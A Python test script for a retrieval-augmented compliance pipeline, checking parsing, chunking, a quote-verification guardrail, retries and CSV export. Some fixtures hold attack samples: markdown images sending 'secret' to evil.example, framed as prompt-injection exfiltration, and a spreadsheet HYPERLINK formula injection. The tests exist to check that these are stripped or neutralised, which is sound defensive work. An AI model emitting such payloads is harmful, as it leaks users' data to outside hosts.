"""
Runnable checks for the RAG pipeline.   Usage:

    .venv/bin/python tests/test_rag.py           # offline checks only (fast, no API calls)
    .venv/bin/python tests/test_rag.py --live    # also hits the Gemini API

No pytest, no fixtures - plain asserts, so it runs anywhere with one command.
The offline half is the half that matters: it pins the guardrail and the
parsing edge cases, which is where a silent regression would do real damage.
"""

from __future__ import annotations

import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from langchain_core.documents import Document  # noqa: E402

from rag import compliance, core  # noqa: E402

SAMPLES = ROOT / "data" / "samples"
_checks = 0


def check(label: str, condition: bool, detail: str = "") -> None:
    global _checks
    _checks += 1
    if not condition:
        raise AssertionError(f"{label}" + (f" -- {detail}" if detail else ""))
    print(f"  ok  {label}")


class FakeLLM:
    """A model whose reply we control, so the guardrail can be tested offline."""

    def __init__(self, payload: str):
        self.payload = payload

    def invoke(self, _prompt):
        class Reply:
            content = self.payload

        return Reply()


# ---------------------------------------------------------------------------


def test_parsing() -> None:
    print("\n[parsing]")
    txt = (SAMPLES / "acme_security_policy.txt").read_bytes()
    pages = core.parse_document(txt, "policy.txt")
    check("txt parses to one unpaginated page", len(pages) == 1 and pages[0][0] is None)

    pdf_path = SAMPLES / "acme_pentest_assessment.pdf"
    pages = core.parse_document(pdf_path.read_bytes(), "pentest.pdf")
    check("pdf yields >1 page", len(pages) > 1, f"got {len(pages)}")
    check("pdf pages are 1-indexed", [p for p, _ in pages] == list(range(1, len(pages) + 1)))
    # Page attribution is what makes a "p.2" citation trustworthy: content
    # from page 2 must not be reported as page 1.
    p1 = next(t for p, t in pages if p == 1)
    p2 = next(t for p, t in pages if p == 2)
    check("page 1 holds the report title", "INDEPENDENT SECURITY ASSESSMENT" in p1)
    check("page 2 content is attributed to page 2",
          "METHODOLOGY" in p2 and "METHODOLOGY" not in p1)

    for data, name, exc in [
        (b"hello", "notes.xlsx", core.UnsupportedFile),
        (b"   \n\t ", "blank.txt", core.NoExtractableText),
        (b"%PDF-1.4 truncated", "corrupt.pdf", core.UnsupportedFile),
        (b"", "empty.pdf", core.UnsupportedFile),
        (b"not a zip", "corrupt.docx", core.UnsupportedFile),
        (b"\xd0\xcf\x11\xe0 legacy binary", "renamed.doc.docx", core.UnsupportedFile),
    ]:
        try:
            core.parse_document(data, name)
            raise AssertionError(f"{name} should have raised {exc.__name__}")
        except exc:
            pass
    check("bad inputs raise our own exception types, never a library's", True)

    messy = "Section  1\xa0\xa0 title\n   \n\n\n\n  indented   text  \n"
    clean = core._normalise_whitespace(messy)
    check("whitespace collapses", "  " not in clean and "\n\n\n" not in clean, repr(clean))
    check("paragraph breaks survive", "\n\n" in core._normalise_whitespace("a\n\n\n\n\nb"))
    check("ligatures are unfolded (the World Bank PDF has 1,559)",
          core._normalise_whitespace("conﬂict and ﬁscal") == "conflict and fiscal")


def test_chunking() -> None:
    print("\n[chunking]")
    pages = [(1, "A" * 2400), (2, "B" * 900)]
    docs = core.chunk_pages(pages, "doc.pdf", chunk_size=1000, chunk_overlap=150)
    check("produces multiple chunks", len(docs) > 3, f"got {len(docs)}")
    check("no chunk exceeds chunk_size", all(len(d.page_content) <= 1000 for d in docs))
    # A chunk spanning two pages could not be cited unambiguously.
    check("no chunk mixes content from two pages",
          all(set(d.page_content) <= {"A"} or set(d.page_content) <= {"B"} for d in docs))
    check("every chunk carries source + page", all(
        d.metadata.get("source") == "doc.pdf" and "page" in d.metadata for d in docs))
    check("unpaginated pages record page 0",
          core.chunk_pages([(None, "x" * 50)], "n.txt")[0].metadata["page"] == 0)


def test_question_extraction() -> None:
    print("\n[question extraction]")
    text = (SAMPLES / "vendor_security_questionnaire.txt").read_text()
    qs = compliance.extract_questions_heuristic(text)
    check("all 12 questions extracted", len(qs) == 12, f"got {len(qs)}")
    # Regression guard: these have the shape "Is X? State Y." and were dropped
    # by an endswith('?') test. A dropped question silently hides a gap.
    check("mid-line '?' questions are kept",
          any("State the algorithm" in q for q in qs)
          and any("coverage limit" in q for q in qs))
    check("numbering stripped from question text", not qs[0].startswith("1."))
    check("no duplicates", len(qs) == len(set(qs)))
    check("'1.1'-style numbering is stripped whole, not left as '1 Is...'",
          compliance.extract_questions_heuristic(
              "1.1 Is customer data encrypted at rest?\n2.3 How long are logs retained?")
          == ["Is customer data encrypted at rest?", "How long are logs retained?"])
    for name, preset in compliance.PRESETS.items():
        check(f"preset non-empty: {name[:34]}", len(preset) >= 8)


def test_guardrail() -> None:
    """
    The core safety property: a claim of coverage survives only if a verbatim
    supporting quote is found in the retrieved text.
    """
    print("\n[guardrail]")
    hits = [(Document(page_content="Logs are retained for 12 months.",
                      metadata={"source": "policy.txt", "page": 0}), 0.4)]
    q = "How long are logs kept?"

    cases = [
        ("fabricated quote", '{"verdict":"COVERED","answer":"7 years.","quotes":["Logs are retained for 7 years."]}', core.NOT_FOUND),
        ("paraphrased quote", '{"verdict":"COVERED","answer":"12 months.","quotes":["Log retention is twelve months"]}', core.NOT_FOUND),
        ("no quote supplied", '{"verdict":"COVERED","answer":"Yes.","quotes":[]}', core.NOT_FOUND),
        ("reply is not JSON", 'Probably yes, I think.', core.NOT_FOUND),
        ("bogus verdict string", '{"verdict":"DEFINITELY","answer":"x","quotes":[]}', core.NOT_FOUND),
        ("genuine quote", '{"verdict":"COVERED","answer":"12 months.","quotes":["Logs are retained for 12 months."]}', core.COVERED),
        ("genuine quote, whitespace differs", '{"verdict":"COVERED","answer":"12 months.","quotes":["Logs   are retained\\nfor 12 months."]}', core.COVERED),
        ("json wrapped in a code fence", '```json\n{"verdict":"COVERED","answer":"12 months.","quotes":["Logs are retained for 12 months."]}\n```', core.COVERED),
    ]
    for label, payload, expected in cases:
        f = core.answer_question(FakeLLM(payload), q, hits)
        check(f"{label} -> {expected}", f.verdict == expected,
              f"got {f.verdict} ({f.note})")

    f = core.answer_question(FakeLLM(cases[0][1]), q, hits)
    check("downgrade drops the unverified answer text", f.answer == "")
    check("downgrade explains itself", "Downgraded" in f.note)

    # The quote is real, the answer is not: every number must be in evidence.
    f = core.answer_question(FakeLLM(
        '{"verdict":"COVERED","answer":"Logs are kept for 7 years.",'
        '"quotes":["Logs are retained for 12 months."]}'), q, hits)
    check("real quote + invented number -> NOT_FOUND", f.verdict == core.NOT_FOUND
          and "7" in f.note and f.citations, f.note)
    f = core.answer_question(FakeLLM(
        '{"verdict":"COVERED","answer":"Yes - 12 months, more than 6 months.",'
        '"quotes":["Logs are retained for 12 months."]}'), "Are logs kept at least 6 months?", hits)
    check("a number repeated from the question is not an invented one",
          f.verdict == core.COVERED, f.note)
    table = [(Document(page_content="| Greenhouse gas emissions | iMac (two ports) 256GB |\n"
                                    "| Total product footprint | 346 kg CO2e |",
                       metadata={"source": "imac.pdf", "page": 10}), 0.2)]
    f = core.answer_question(FakeLLM(
        '{"verdict":"COVERED","answer":"346 kg CO2e for the two-port 256GB iMac.",'
        '"quotes":["| Total product footprint | 346 kg CO2e |"]}'), "q", table)
    check("a number from the quoted passage's table header is supported, not invented",
          f.verdict == core.COVERED, f.note)

    # Same quote, typographically different: still the same quote.
    revoke = [(Document(page_content="Access is revoked within 4 working hours "
                        "of an employee's termination.", metadata={"source": "p.txt"}), 0.3)]
    f = core.answer_question(FakeLLM(
        '{"verdict":"COVERED","answer":"Within 4 working hours.",'
        '"quotes":["within 4 working hours of an employee’s termination"]}'), "q", revoke)
    check("a curly apostrophe in the quote still verifies", f.verdict == core.COVERED, f.note)
    lig = [(Document(page_content="the conﬂict in the Middle East raised prices",
                     metadata={"source": "gep.pdf", "page": 19}), 0.3)]
    f = core.answer_question(FakeLLM(
        '{"verdict":"COVERED","answer":"The conflict.",'
        '"quotes":["the conflict in the Middle East"]}'), "q", lig)
    check("a ligature in the document still verifies", f.verdict == core.COVERED, f.note)

    # One repair round: the rejected model is told why and answers again,
    # and the second reply faces exactly the same checks.
    class SequenceLLM:
        def __init__(self, *payloads):
            self.payloads, self.calls = list(payloads), []

        def invoke(self, prompt):
            self.calls.append(prompt)
            text = self.payloads[min(len(self.calls), len(self.payloads)) - 1]

            class Reply:
                content = text

            return Reply()

    invented = '{"verdict":"COVERED","answer":"7 years.","quotes":["Logs are retained for 12 months."]}'
    grounded = '{"verdict":"COVERED","answer":"12 months.","quotes":["Logs are retained for 12 months."]}'
    llm = SequenceLLM(invented, grounded)
    f = core.answer_question(llm, q, hits, repair=True)
    check("repair: a rejected reply gets one second chance and passes the same checks",
          f.verdict == core.COVERED and len(llm.calls) == 2 and "second attempt" in f.note
          and "automatic check" in llm.calls[1], f.note)
    table_hits = hits + [(Document(page_content="| Logs | 2026f |\n| retention | 6.9 |",
                                   metadata={"source": "t", "page": 2}), 0.5)]
    llm = SequenceLLM('{"verdict":"COVERED","answer":"12 months, rising to 6.9.",'
                      '"quotes":["Logs are retained for 12 months."]}', grounded)
    core.answer_question(llm, q, table_hits, repair=True)
    check("the repair message says WHERE an unquoted figure is (passage [2])",
          "6.9 appears in passage [2]" in llm.calls[1], llm.calls[1][-200:])
    llm = SequenceLLM(invented, invented)
    f = core.answer_question(llm, q, hits, repair=True)
    check("repair cannot rescue an invented answer - it stays withheld",
          f.verdict == core.NOT_FOUND and "after one repair attempt" in f.note, f.note)
    llm = SequenceLLM(grounded)
    core.answer_question(llm, q, hits, repair=True)
    check("no repair call when the first reply passes", len(llm.calls) == 1)
    llm = SequenceLLM(invented, grounded)
    core.answer_question(llm, q, hits)
    check("repair is off by default (the Compliance Copilot path is unchanged)", len(llm.calls) == 1)

    # Prompt injection could make the model emit an image that leaks text.
    f = core.answer_question(FakeLLM(
        '{"verdict":"COVERED","answer":"12 months. ![x](https://evil.example/?d=secret)",'
        '"quotes":["Logs are retained for 12 months."]}'), q, hits)
    check("markdown images are stripped from answers",
          "![" not in f.answer and "evil" not in f.answer, f.answer)

    f = core.answer_question(FakeLLM('{"verdict":"COVERED","answer":"a","quotes":["Logs are retained for 12 months."]}'), q, hits)
    check("verified citation keeps source + distance",
          f.citations[0].source == "policy.txt" and f.citations[0].distance == 0.4)

    f = core.answer_question(FakeLLM('{"verdict":"COVERED","answer":"x","quotes":["short"]}'), q, hits)
    check("quotes too short to be evidence are ignored", f.verdict == core.NOT_FOUND)

    check("empty retrieval never reports coverage",
          core.answer_question(FakeLLM('{"verdict":"COVERED","answer":"x","quotes":["y"]}'), q, []).verdict
          == core.NOT_FOUND)


def test_helpers() -> None:
    print("\n[helpers]")
    class R:
        content = [{"type": "text", "text": "READY"}, {"type": "other", "x": 1}]
    check("get_text unwraps Gemini content blocks", core.get_text(R()) == "READY")

    class S:
        content = "plain"
    check("get_text passes strings through", core.get_text(S()) == "plain")
    check("_extract_json survives a preamble",
          core._extract_json('Sure!\n```json\n{"a":1}\n```')["a"] == 1)
    check("icons map to every verdict",
          {core.Finding("q", v, "").icon
           for v in (core.COVERED, core.PARTIAL, core.NOT_FOUND, core.ERROR)}
          == {"✅", "⚠️", "❌", "🛑"})


def test_sections() -> None:
    print("\n[structure-aware chunking]")
    text = (SAMPLES / "acme_security_policy.txt").read_text()
    text = core._normalise_whitespace(text)
    sections = core.split_into_sections(text)
    headings = [h for h, _ in sections if h]
    check("top-level headings found", len(headings) >= 7, str(headings))
    check("clause numbers are NOT treated as headings",
          not any(h.startswith("2.1") or h.startswith("3.1") for h in headings),
          "splitting on every clause would shred the doc into single sentences")
    check("a doc with no headings returns one section",
          core.split_into_sections("just some prose, no headings here") ==
          [(None, "just some prose, no headings here")])
    check("a page number on its own line does not glue onto the next line",
          core.split_into_sections("3\n\nSECTION I\nbody") == [(None, "3\n\nSECTION I\nbody")])

    docs = core.chunk_pages_structured([(None, text)], "policy.txt")
    check("one chunk per section", len(docs) == len(sections), f"{len(docs)} vs {len(sections)}")
    check("section recorded in metadata", any(d.metadata["section"] for d in docs))
    logging_chunk = next(d for d in docs if "12 months" in d.page_content)
    check("log-retention chunk is the LOGGING section, not the password one",
          "LOGGING" in logging_chunk.metadata["section"],
          logging_chunk.metadata["section"])

    # An oversized section must still carry its heading into every fragment,
    # or a mid-section chunk retrieves with no idea what it is about.
    big = [(1, "5. LOGGING AND MONITORING\n" + ("word " * 800))]
    frags = core.chunk_pages_structured(big, "big.pdf", chunk_size=500, chunk_overlap=50)
    check("oversized section splits into several chunks", len(frags) > 2)
    check("every fragment keeps its heading",
          all(f.page_content.startswith("5. LOGGING") for f in frags))


def test_retry() -> None:
    print("\n[transient-error retry]")
    calls = {"n": 0}

    def flaky():
        calls["n"] += 1
        if calls["n"] < 3:
            raise RuntimeError("429 Resource has been exhausted (quota)")
        return "ok"

    check("retries through a 429 and succeeds",
          core.with_retry(flaky, attempts=4, base_delay=0.01) == "ok" and calls["n"] == 3)

    calls["n"] = 0

    def overloaded():
        calls["n"] += 1
        if calls["n"] < 2:
            raise RuntimeError("503 UNAVAILABLE: The model is overloaded.")
        return "ok"

    check("retries through a 503 'model overloaded'",
          core.with_retry(overloaded, attempts=3, base_delay=0.01) == "ok")

    calls["n"] = 0

    def daily_cap():
        calls["n"] += 1
        raise RuntimeError("429 RESOURCE_EXHAUSTED quotaId GenerateRequestsPerDayPerProjectPerModel-FreeTier")

    try:
        core.with_retry(daily_cap, attempts=4, base_delay=0.01)
    except RuntimeError:
        pass
    check("a DAILY quota error is raised at once - seconds of waiting cannot clear it",
          calls["n"] == 1, f"called {calls['n']} times")

    def broken():
        raise ValueError("malformed request - not transient")

    try:
        core.with_retry(broken, attempts=3, base_delay=0.01)
        raise AssertionError("a non-transient error must not be retried")
    except ValueError:
        pass
    check("a non-rate-limit error is raised immediately, not retried", True)


def test_model_choice() -> None:
    print("\n[model choice]")
    import os

    real = core.list_available_models
    pinned_by_caller = os.environ.get("GEMINI_CHAT_MODEL")
    core.list_available_models = lambda key: (["gemini-3.1-flash-lite", "gemini-3.5-flash-lite"],
                                              ["gemini-embedding-001"])
    try:
        os.environ.pop("GEMINI_CHAT_MODEL", None)
        check("the first preferred model (the one the evaluation used) is chosen by default",
              core.resolve_models("k")[0] == "gemini-3.5-flash-lite")
        os.environ["GEMINI_CHAT_MODEL"] = "gemini-3.1-flash-lite"
        check("GEMINI_CHAT_MODEL pins the answer model", core.resolve_models("k")[0] == "gemini-3.1-flash-lite")
        os.environ["GEMINI_CHAT_MODEL"] = "gemini-not-on-this-key"
        check("a pinned model the key cannot reach is ignored, not used blindly",
              core.resolve_models("k")[0] == "gemini-3.5-flash-lite")
    finally:
        # Restore, never just delete: a caller (the --live run) may have pinned a model.
        os.environ.pop("GEMINI_CHAT_MODEL", None)
        if pinned_by_caller is not None:
            os.environ["GEMINI_CHAT_MODEL"] = pinned_by_caller
        core.list_available_models = real


def test_export() -> None:
    print("\n[export + summary]")
    findings = [
        core.Finding("Q1", core.COVERED, "Yes, AES-256.",
                    [core.Citation("policy.pdf", 4, "encrypted with AES-256", 0.31)]),
        core.Finding("Q2", core.NOT_FOUND, "", [], "nothing found"),
        core.Finding("Q3, with a comma", core.PARTIAL, 'He said "maybe"', []),
        core.Finding('=HYPERLINK("http://x","click")', core.NOT_FOUND, ""),
    ]
    counts = compliance.summarise(findings)
    check("summary counts each verdict",
          counts == {core.COVERED: 1, core.PARTIAL: 1, core.NOT_FOUND: 2, core.ERROR: 0,
                     "total": 4}, str(counts))

    import csv, io
    rows = list(csv.reader(io.StringIO(compliance.findings_to_csv(findings))))
    check("csv has a header plus one row per finding", len(rows) == 5, str(len(rows)))
    check("a formula in an untrusted question is exported as text",
          rows[4][1].startswith("'="), rows[4][1])
    # Commas and quotes in questions/answers must not break the CSV a
    # respondent pastes straight back into a client's spreadsheet.
    check("commas and quotes survive csv quoting",
          rows[3][1] == "Q3, with a comma" and rows[3][3] == 'He said "maybe"', str(rows[3]))
    check("evidence quote is exported", "AES-256" in rows[1][5])


def test_extraction_fallback() -> None:
    print("\n[extraction fallback]")
    text = (SAMPLES / "vendor_security_questionnaire.txt").read_text()
    check("no llm falls back to the heuristic",
          len(compliance.extract_questions(text, llm=None)) == 12)
    check("an unusable llm reply falls back rather than returning nothing",
          len(compliance.extract_questions(text, llm=FakeLLM("I cannot help with that."))) == 12)
    check("an empty llm list falls back too",
          len(compliance.extract_questions(text, llm=FakeLLM("[]"))) == 12)
    good = FakeLLM('["Only question one?", "Only question two?"]')
    check("a good llm reply is used", compliance.extract_questions(text, llm=good) ==
          ["Only question one?", "Only question two?"])


def test_chat() -> None:
    print("\n[chat mode]")
    answer, cites = core.chat_answer(FakeLLM("unused"), "anything?", [])
    check("empty retrieval says so instead of inventing", "could not find" in answer.lower())
    check("empty retrieval cites nothing", cites == [])

    hits = [(Document(page_content="TLS 1.3 is enforced.",
                      metadata={"source": "arch.pdf", "page": 2}), 0.2)]
    answer, cites = core.chat_answer(
        FakeLLM("TLS 1.3 [arch.pdf, p.2]"), "which tls?", hits,
        history=[("hi", "hello")])
    check("answer returned with citations", "TLS 1.3" in answer and len(cites) == 1)
    check("citation label includes the page", cites[0].label() == "arch.pdf, p.2")
    answer, _ = core.chat_answer(
        FakeLLM("TLS 1.3 ![](https://evil.example/x.png?d=secret)"), "which tls?", hits)
    check("markdown images are stripped from chat answers", "![" not in answer, answer)


def test_batch_audit() -> None:
    print("\n[batch audit - offline]")
    hits = [(Document(page_content="Logs are retained for 12 months.",
                      metadata={"source": "p.txt", "page": 0}), 0.3)]

    class Store:
        def similarity_search_by_vector_with_relevance_scores(self, _vec, k):
            return hits

    class Embeddings:
        def embed_query(self, _q):
            return [0.0]

    class Broken:
        def invoke(self, _prompt):
            raise ValueError("400 INVALID_ARGUMENT")

    real = core.make_embeddings
    core.make_embeddings = lambda *a, **k: Embeddings()
    try:
        good = FakeLLM('{"verdict":"COVERED","answer":"12 months.",'
                       '"quotes":["Logs are retained for 12 months."]}')
        found = compliance.run_audit(["How long are logs kept?"], Store(), good, "emb")
        failed = compliance.run_audit(["q1", "q2"], Store(), Broken(), "emb")
    finally:
        core.make_embeddings = real
    check("a normal question is answered", found[0].verdict == core.COVERED, found[0].note)
    check("a question that crashes is ERROR, never a NOT_FOUND gap",
          [f.verdict for f in failed] == [core.ERROR, core.ERROR], str([f.note for f in failed]))
    counts = compliance.summarise(failed)
    check("errors are counted apart from gaps",
          counts[core.ERROR] == 2 and counts[core.NOT_FOUND] == 0, str(counts))


def test_prune_offline() -> None:
    print("\n[collection pruning - offline]")
    check("pruning a directory that does not exist is a no-op",
          core.prune_collections("/tmp/definitely_not_a_chroma_dir_xyz") == 0)


def test_live() -> None:
    """Hits the API. Verifies the two things only a real call can show."""
    print("\n[live api]")
    import os
    from dotenv import load_dotenv
    load_dotenv(ROOT / ".env")
    key = os.environ.get("GOOGLE_API_KEY", "").strip()
    if not key:
        print("  SKIP - no GOOGLE_API_KEY"); return

    from langchain_google_genai import ChatGoogleGenerativeAI
    chat_model, embed_model = core.resolve_models(key)
    check(f"models resolved ({chat_model} / {embed_model})", bool(chat_model and embed_model))

    docs = []
    for name in ("acme_security_policy.txt", "acme_architecture.txt"):
        docs += core.chunk_pages(core.parse_document((SAMPLES / name).read_bytes(), name), name)
    store = core.build_index(docs, embed_model, persist_directory="/tmp/chroma_test", api_key=key)
    check("all chunks indexed", store._collection.count() == len(docs))

    hits = core.retrieve(store, "How long are security audit logs retained?",
                        embed_model, k=5, api_key=key)
    check("retrieval returns k hits", len(hits) == 5)
    # Chroma's method says "relevance_scores" but returns DISTANCES. If this
    # ever flips, every citation ranking in the UI silently inverts.
    dists = [d for _, d in hits]
    check("distances ascend (lower == closer)", dists == sorted(dists), str(dists))
    check("nearest chunk actually answers the question",
          "12 months" in hits[0][0].page_content)

    llm = ChatGoogleGenerativeAI(model=chat_model, temperature=0, google_api_key=key)
    f = core.answer_question(llm, "What is the capital of France?", hits)
    check("world knowledge is refused", f.verdict == core.NOT_FOUND, f.answer)

    f = core.answer_question(llm, "How long are security audit logs retained?", hits)
    check("a real question is answered with a citation",
          f.verdict == core.COVERED and f.citations, f"{f.verdict} {f.note}")
    check("citation quote is genuinely in the chunk",
          core._normalise_for_match(f.citations[0].quote)
          in core._normalise_for_match(" ".join(d.page_content for d, _ in hits)))

# Reload recovery depends on reopening a collection without re-embedding.
    summary = core.collection_summary(store)
    check("collection_summary rebuilds the per-document chunk counts",
          dict(summary) and sum(n for _, n in summary) == len(docs), str(summary))

    reopened = core.open_index(embed_model, store._collection.name,
                              persist_directory="/tmp/chroma_test", api_key=key)
    check("an existing collection reopens with its chunks intact",
          reopened._collection.count() == len(docs))
    hits2 = core.retrieve(reopened, "How long are security audit logs retained?",
                         embed_model, k=3, api_key=key)
    check("the reopened collection still answers", "12 months" in hits2[0][0].page_content)

    # A .txt has no pages, so its label carries none. The model used to append
    # a plausible "p.1" anyway - a fabricated citation in an app whose whole
    # promise is trustworthy citations.
    import re
    answer, _ = core.chat_answer(llm, "What TLS version is enforced?", hits)
    check("no page number is invented for a paginationless source",
          not re.findall(r"\[[^\]]*\.txt,\s*p\.\d+\]", answer), answer[:160])


if __name__ == "__main__":
    live = "--live" in sys.argv
    test_parsing()
    test_chunking()
    test_sections()
    test_question_extraction()
    test_extraction_fallback()
    test_guardrail()
    test_retry()
    test_model_choice()
    test_export()
    test_chat()
    test_batch_audit()
    test_prune_offline()
    test_helpers()
    if live:
        test_live()
    else:
        print("\n[live api]\n  SKIP - pass --live to include API checks")
    print(f"\nall {_checks} checks passed")
